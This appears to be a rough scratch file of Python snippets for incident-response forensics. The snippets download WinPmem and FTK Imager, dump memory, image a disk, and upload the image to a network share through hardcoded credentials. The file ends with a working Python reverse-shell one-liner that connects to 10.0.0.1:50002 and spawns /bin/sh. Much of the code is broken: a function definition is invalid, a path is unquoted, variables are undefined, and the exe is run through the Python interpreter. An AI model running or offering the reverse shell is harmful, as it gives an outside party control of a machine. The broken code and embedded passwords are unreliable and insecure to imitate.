os.system("bitsadmin /transfer myDownloadJob /download /priority normal https://github.com/Velocidex/WinPmem/releases/download/v4.0.rc1/winpmem_mini_x64_rc2.exe C:\winpmem.exe")

import os
import sys
import subprocess

os.system("curl -sLo C:\winpmem.exe --url https://192.168.1.145/winpmem_mini_x64_rc2.exe")
subprocess.call([sys.executable, "C:\\winpmem.exe", "physmem.raw"])




import os
import sys
import subprocess
import shutil

subprocess.run(r'net use Z: \\192.168.1.145\ftkimage /user:securityteam SecurityTeam01', shell=True)

def ftk_download():
	os.system("curl -k -sLo C:\ftkimager.exe https://192.168.1.145/ftk.exe")

def ftk_run():
	os.system("mkdir E:\\ftkimages")
	subprocess.run("C:\\ftkimager.exe \\\\.\\PhysicalDrive0 E:\\image_folder\\systemimage --e01 –-frag 2G –-compress 9 –-verify", shell=True)

def unmount_network_share():
    # Unmount the network share
    command = f"net use Z: /delete"
    subprocess.run(command, shell=True)

def upload('E:\\image_folder\\systemimage', 'Z:\\'):
    # Check if the file exists
    if not os.path.exists(E:\\image_folder\\systemimage):
        print("File not found.")
        return
        
    # Upload the compressed file to the network share
    shutil.copy('E:\\image_folder\\systemimage', 'Z:\\')
    
    # Clean up temporary files
    os.remove('E:\\image_folder\\systemimage')

# Example usage
file_path = 'E:\\image_folder\\systemimage'
password = 'SecurityTeam01'
share_path = '\\192.168.1.145\\ftkiimages'  # Network share path
username = 'securityteam'
mount_point = 'Z:'  # Drive letter to mount the network share
destination = 'Z:\\'  # Destination folder on the network share


upload(image_file_path, destination)
unmount_network_share(mount_point)



import os 

def mount_share(drive_letter, network_path, username=None, password=None):
    command = f"net use {drive_letter}: {network_path}"
    if username and password:
        command += f" /user:{username}  {password}"
    os.system(command)

mount_share('Z', r'\\192.168.1.145\ftkimage', 'username', 'password', /persistent:no)

import os 

def mount_share(drive_letter, network_path, persistent, username=None, password=None):
    command = f"net use {drive_letter}: {network_path} {persistent}"
    if username and password:
        command += f" /user:{username}  {password}"
    os.system(command)

mount_share('Z', r'\\192.168.1.145\ftkimage', '/persistent:no', 'username', 'password')



bash -c python3.12 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",50002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' 